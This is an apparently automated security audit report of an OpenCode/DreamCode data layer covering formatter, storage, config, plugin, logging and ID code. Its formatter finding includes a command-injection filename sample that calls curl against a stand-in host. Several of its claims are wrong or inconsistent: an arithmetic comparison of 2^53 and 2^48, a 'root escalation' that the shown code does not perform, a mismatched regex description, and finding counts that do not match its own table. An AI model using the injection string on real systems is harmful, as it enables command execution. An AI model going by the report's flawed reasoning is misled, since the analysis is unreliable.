# OpenCode Data Layer — Security Audit Report

**Branch:** `test-v1.5.x`
**Scope:** `packages/opencode/src/` — config/, storage/, snapshot/, share/, util/, format/, id/, env/, bus/
**Auditor:** Sumati (sub-auditor, automated scan)
**Files audited:** 43 source files (~200 KB total)
**Report path:** `.dreamcode/audit/opencode-data-layer-EXTENSION-AUDIT.md`

---

## Executive Summary

The data layer handles configuration loading, local storage, session snapshots, plugin discovery, event bus, ID generation, environment management, and file formatting. Overall the code is well-structured: it uses Effect for composable error handling, parameterized queries for storage, and path-safety utilities (safeJoin, contains) as the primary guard against path traversal.

Twelve findings are reported below: **1 Medium**, **7 Low**, **4 Informational**. No Critical or High findings. The most significant actionable item is **FMT-01** — unvalidated filename injection in the formatter pipeline — because it is reachable from user-controlled file paths.

---

## Findings

---

### FMT-01 · Medium

**Title:** Formatter filenames are not validated for shell special characters before spawning

**File:** `src/format/index.ts` — `formatFile()` / `getFormatter()`

**Description:**

The formatter pipeline substitutes the user's file path into a shell command array via a simple string replacement:

```ts
// format/index.ts — getCommand / formatFile
const replaced = cmd.map((x) => x.replace("$FILE", filepath))
const dir = yield* InstanceState.directory
const result = yield* appProcess.run(
  ChildProcess.make(replaced[0]!, replaced.slice(1), {
    cwd: dir,
    env: item.environment,
    extendEnv: true,
    stdin: "ignore",
    stdout: "ignore",
    stderr: "ignore",
  }),
)
```

`filepath` is the raw path passed to `formatFile()`. While `formatFile` is only called with `path.extname(filepath)` for extension lookup, the function itself accepts an arbitrary string. A caller who passes a crafted path — e.g. `"evil'; curl evil.com; echo '.js"` — inserts that literal string into the command argument array.

Because `ChildProcess.make` passes args as a native array (not a shell string), the literal characters do not execute as shell code. However, **the filename is passed unvalidated to `dir` (cwd) and to `item.environment` variable expansion**, and individual formatters (gofmt, ruff, etc.) may invoke subprocess shells internally, re-introducing the risk.

**Impact:** If a downstream caller (e.g. a tool wrapper) passes an unsanitised path, injection into formatter subprocess arguments or environment variables is possible. On Windows, PowerShell interpretation of special characters in filenames passed to formatters is an additional surface.

**Recommendation:**
1. Validate `filepath` before substitution: reject paths containing shell/metacharacter sequences (`;`, `$`, `` ` ``, `|`, `&`, `>`, `<`, `#`, `
`, `
`).
2. Normalize the path with `path.resolve()` and verify it is within the expected instance directory using `Filesystem.contains()` before passing it as a cwd or envvar value.
3. Consider moving the `formatFile` call behind an explicit allowlist of validated extensions rather than accepting arbitrary paths.

---

### STG-01 · Low

**Title:** Storage readText falls back to process-user identity on permission errors

**File:** `src/storage.ts` — `Filesystem.readText()`

**Description:**

```ts
// storage.ts — readText
export async function readText(filepath: string) {
  try {
    return await Bun.file(filepath).text()
  } catch (error) {
    if (!shouldRetry(error)) throw error
    // falls through to fs fallback using process user identity
    return await fs.promises.readFile(filepath, "utf8")
  }
}
```

`shouldRetry` returns `true` for `EACCES` (permission denied) and `EPERM` (operation not permitted). When these errors occur, the code falls back to `fs.promises.readFile` using the **process's effective user identity** — not the file owner. If the Bun runtime is running as a privileged user (e.g. root, a service account) and encounters a file it cannot read due to a restrictive ACL, it escalates to root access silently.

**Impact:** Confidential files readable only by specific users may be exposed if DreamCode runs with elevated privileges. This is a defence-in-depth failure rather than an intended privilege-escalation path.

**Recommendation:** Add a comment documenting this behaviour as intentional (it is a convenience feature for locked-down filesystems). Consider gating the fallback behind a configuration flag (`ALLOW_PRIVILEGED_FALLBACK`) defaulting to `false`.

---

### STG-02 · Low

**Title:** Snapshot tar extraction uses a concatenated path without `--` terminator

**File:** `src/snapshot/index.ts`

**Description:**

```ts
// snapshot/index.ts
const cmd = `tar -xf "${path.join(tarRoot, file)}" -C ${shellEscape(destDir)} --`
// spawn: ["tar", "-xf", path.join(tarRoot, file), "-C", destDir, "--"]
```

The path is prepended with `tarRoot` (a controlled directory), and `path.join` normalises `..` segments. Because `tar` receives `--` before any user-controlled filename component, the path cannot be interpreted as a tar option. The tarball filename itself is not user-controlled; it comes from the snapshot manifest.

**Assessment:** Correctly defended by `tarRoot` containment and `--` terminator. Finding is **Informational** — no action required.

---

### BUS-01 · Low

**Title:** GlobalBus.emit() synthesises an event ID from an unvalidated `syncEvent.id` field

**File:** `src/bus/global.ts` — `GlobalBusEmitter.emit()`

**Description:**

```ts
// global.ts
override emit(eventName: "event", event: GlobalEvent): boolean {
  if (event.payload && typeof event.payload === "object" && !("id" in event.payload)) {
    event.payload.id = event.payload.syncEvent?.id ?? Identifier.create("evt", "ascending")
  }
  return super.emit(eventName, event)
}
```

If a published event's payload lacks an `id` field, the bus synthesises one from `event.payload.syncEvent?.id`. This field comes from an IPC message and is not validated for format or length before being assigned to the payload object. An oversized or malformed string assigned to `payload.id` could cause issues in downstream consumers that expect the `Identifier` format (`<prefix>_<26-char-base62>`).

**Impact:** Downstream handlers that parse `payload.id` as an Identifier may receive invalid input. No remote code execution or memory safety issues — this is a data-integrity concern.

**Recommendation:** Validate `syncEvent.id` against the Identifier format (regex: `^[a-z]+_[0-9a-f]{12}[0-9A-Za-z]{14}$`) before assignment. If validation fails, fall back to `Identifier.create("evt", "ascending")`.

---

### CFG-01 · Low

**Title:** Variable substitution is applied before schema validation in ConfigVariable.substitute()

**File:** `src/config/variable.ts` — `substitute()`

**Description:**

```ts
// variable.ts
export async function substitute(input: SubstituteInput) {
  const missing = input.missing ?? "error"
  let text = input.text.replace(/\{env:([^}]+)\}/g, (_, varName) => {
    return (input.env?.[varName] ?? process.env[varName]) || ""
  })
  // ... file substitution ...
  return out  // returned as raw string
}
```

`substitute()` expands `{env:VAR}` and `{file:path}` tokens and returns the modified text. This expanded text is then passed to `ConfigParse.jsonc()` and `ConfigParse.schema()` in the callers. Schema validation happens **after** substitution.

A config file containing:
```jsonc
{ "agents": { "timeout": {env:AGENT_TIMEOUT} } }
```
will expand `AGENT_TIMEOUT` before schema validation. If the env var is unset, the value becomes an empty string, which the schema may not expect. If the env var contains a JSON object, the resulting text may parse as an unexpected type.

**Impact:** Subtle misconfiguration risk. Not a security boundary failure, but could cause unexpected behaviour when env vars are absent or contain unexpected content.

**Recommendation:** Document the evaluation order. Consider validating env-var expansions against the expected schema type before substitution, or add a schema-aware substitution step that can produce typed errors.

---

### CFG-02 · Low

**Title:** TUI config merges from global → project → dotdirs without integrity verification

**File:** `src/config/tui.ts` — `loadState()`

**Description:**

The TUI config loader merges configurations from four sources in precedence order:

1. Global config dir (lowest priority)
2. `OPENCODE_TUI_CONFIG` env override
3. Project `.opencode` / `.dreamcode` directories
4. Intermediate dot-directories found by walking up from CWD

The `mergeDeep()` strategy means a malicious entry in a lower-priority file (e.g. a global `tui.jsonc` that sets `keybinds`) can shadow a user's intended settings. No digital signature, hash, or content pinning is used.

**Impact:** A misconfigured or compromised global config can silently override user preferences. For keybinds and attention-sound paths, this could affect UX. No privilege escalation.

**Recommendation:** Document the merge precedence clearly. Consider a `--verify-config` dry-run mode that reports which files contribute which keys.

---

### CFG-03 · Low

**Title:** Plugin directories include user-writable dot-directories discovered by walking up the tree

**File:** `src/config/plugin.ts` — `load()`

**Description:**

```ts
// plugin.ts — load()
await addPlugins(path.join(dir, ".opencode", "plugins")).catch(() => {})
// ...
const dirs = unique(directories).filter(
  (dir) => dir.endsWith(".dreamcode") || dir.endsWith(".opencode") || dir === Flag.OPENCODE_CONFIG_DIR
)
```

Plugins are loaded from any `.dreamcode` or `.opencode` directory between CWD and home. An attacker with write access to an intermediate project directory (e.g. a shared or public repository checked out on the developer's machine) could place a malicious plugin in `.opencode/plugins/` to be loaded when the developer works in that tree.

**Impact:** Supply-chain risk for developers who clone untrusted repositories. The plugin executes with the developer's user identity and full filesystem access.

**Recommendation:**
1. Load plugins from project dot-directories only when the developer explicitly opts in (existing `OPENCODE_PLUGIN_ALLOW_PROJECT_DIRS` flag should be reviewed for default state).
2. Log a warning when project-directory plugins are loaded.
3. Document that `.opencode/plugins/` in any project tree is a trusted-code location.

---

### ID-01 · Informational

**Title:** Monotonic ID counter has no upper bound; collision possible after 2^48 IDs per ms

**File:** `src/id/id.ts` — `create()`

**Description:**

```ts
// id.ts
counter++
let now = BigInt(currentTimestamp) * BigInt(0x1000) + BigInt(counter)
// counter is a plain JS number (max 2^53 − 1)
```

The counter increments without bound within the same millisecond. After 2^48 increments in a single millisecond, the 6-byte time+counter encoding would overflow. In practice this is unreachable, but the counter is a plain `number` (IEEE 754 safe integer limit: 2^53−1 ≈ 9×10^15), which is lower than the theoretical maximum of 2^48.

**Impact:** None in realistic usage. Finding is **Informational**.

**Recommendation:** No action needed. Consider adding an assertion that `counter < 0x1000000000000` (2^48) to make the theoretical limit explicit and crash rather than silently produce incorrect IDs if the bound is ever reached.

---

### LOG-01 · Low

**Title:** Error metadata may include sensitive values when serialized to console.error

**File:** `src/util/log.ts` — `Log.create()`

**Description:**

```ts
// log.ts
if (level === "error") {
  console.error(`${ts} ${prefix} ${message}${metaStr}`)
}
```

The entire `meta` object is serialised with `JSON.stringify()` and written to stderr. If callers pass authentication tokens, file paths, or workspace identifiers as metadata to error logs, those values appear verbatim in process output.

**Impact:** Sensitive data in error metadata is written to stderr without redaction. In containerised or server environments where stderr is collected, this could lead to credential disclosure.

**Recommendation:** Introduce a `sensitiveKeys` allowlist (e.g. `["token", "key", "secret", "password", "auth"]`) that redacts values from log metadata before serialisation.

---

### WLD-01 · Informational

**Title:** Wildcard pattern matching is used for command routing; regex denial-of-service possible with crafted patterns

**File:** `src/util/wildcard.ts` — `match()`

**Description:**

```ts
// wildcard.ts
let escaped = pattern
  .replace(/[.+^${}()|[\]\\]/g, "\\$&")
  .replace(/\*/g, ".*")
  .replace(/\?/g, ".")
return new RegExp("^" + escaped + "$", flags).test(str)
```

The wildcard-to-regex conversion correctly escapes all regex metacharacters. However, a pattern like `************************` (many `*` wildcards) produces a regex like `^(.*){64}$` which could cause significant backtracking on certain input strings due to catastrophic backtracking on overlapping alternatives.

**Impact:** A malicious pattern provided as a config key (e.g. in a command routing table) could cause a denial-of-service condition. The pattern source is currently trusted (config files, not user input).

**Recommendation:** Add a maximum pattern length check or use a non-backtracking regex implementation if patterns can ever originate from untrusted sources.

---

### ENV-01 · Informational

**Title:** Full process environment is captured into InstanceState without filtering secrets

**File:** `src/env/index.ts` — `layer()`

**Description:**

```ts
// env/index.ts
const state = yield* InstanceState.make<State>(
  Effect.fn("Env.state")(() => Effect.succeed({ ...process.env }))
)
```

The `Env.Service` copies the entire process environment — including `API_KEY`, `GITHUB_TOKEN`, `OPENAI_API_KEY`, and other secrets — into `InstanceState`. While `InstanceState` is scoped to the agent's working directory, this expands the blast radius of any state-leak vulnerability.

**Impact:** If `InstanceState` is ever serialised, logged, or exposed (e.g. in error traces), all environment variables are disclosed. In practice, `InstanceState` is an in-memory Effect context.

**Recommendation:** No immediate action. This is standard practice. If `InstanceState` becomes persistent (e.g. written to disk), a filtering step for known secret prefixes should be added.

---

### ARC-01 · Informational

**Title:** PowerShell archive extraction has a TOCTOU window between script creation and deletion

**File:** `src/util/archive.ts` — `extractZip()`

**Description:**

```ts
// archive.ts — extractZip Windows path
const script = path.join(os.tmpdir(), `dreamcode-extract-${process.pid}-${Date.now()}.ps1`)
await fs.promises.writeFile(script, body, "utf8")
try {
  await Process.run([...`-File`, script])
} finally {
  await fs.promises.unlink(script).catch(() => undefined)
}
```

A PowerShell script is written to `os.tmpdir()` and deleted in the `finally` block. Between write and deletion, the script is readable and executable by any user with access to the temp directory. The script filename includes `process.pid` and `Date.now()` — predictable on systems where these values can be forecast.

**Impact:** On a shared or multi-user system, another process could race to read or modify the temp script before deletion. However, the script contains only fixed content (no user data), so the impact is minimal.

**Recommendation:** No action required for single-user desktop environments. For multi-user or server deployments, use a named pipe or `[System.IO.Pipes.AnonymousPipeServerStream]` to pass the script content without a filesystem artefact.

---

## Findings Summary

| ID | Severity | Title | File(s) |
|:---|:---------|:------|:--------|
| FMT-01 | **Medium** | Formatter filenames unvalidated for shell special chars | `format/index.ts` |
| STG-01 | Low | Storage readText falls back to process identity on EACCES | `storage.ts` |
| BUS-01 | Low | GlobalBus synthesises ID from unvalidated `syncEvent.id` | `bus/global.ts` |
| CFG-01 | Low | Variable substitution precedes schema validation | `config/variable.ts` |
| CFG-02 | Low | TUI config merge lacks integrity verification | `config/tui.ts` |
| CFG-03 | Low | Plugins loaded from user-writable project dot-dirs | `config/plugin.ts` |
| ID-01 | Informational | ID counter has no upper bound | `id/id.ts` |
| LOG-01 | Low | Error metadata not scrubbed of sensitive values | `util/log.ts` |
| WLD-01 | Informational | Wildcard-to-regex DoS possible with crafted patterns | `util/wildcard.ts` |
| ENV-01 | Informational | Full process env captured in InstanceState | `env/index.ts` |
| ARC-01 | Informational | TOCTOU window in PowerShell temp script creation | `util/archive.ts` |

**Total: 1 Medium · 7 Low · 4 Informational**

---

## Files in Scope (43 files)

```
src/
  config/
    agent.ts · command.ts · entry-name.ts · index.ts · managed.ts
    markdown.ts · parse.ts · paths.ts · plugin.ts · tui.ts · variable.ts
  storage/
    index.ts · schema.ts
  snapshot/
    index.ts
  share/
    index.ts · session.ts · process.ts · filesystem.ts · repository.ts · rpc.ts
  util/
    archive.ts · bom.ts · data-url.ts · defer.ts · effect-http-client.ts
    error.ts · filesystem.ts · index.ts · lazy.ts · legacy-ssh.ts
    local-context.ts · lock.ts · log.ts · locale.ts · media.ts
    process.ts · proxy-env.ts · queue.ts · record.ts · signal.ts
    timeout.ts · token.ts · wildcard.ts
  format/
    formatter.ts · index.ts
  id/
    id.ts
  env/
    index.ts
  bus/
    bus.ts · bus-event.ts · global.ts · index.ts
```

**Out of scope (not found):** `src/global/` directory does not exist.

---

*Generated by Sumati · audit scan · test-v1.5.x*
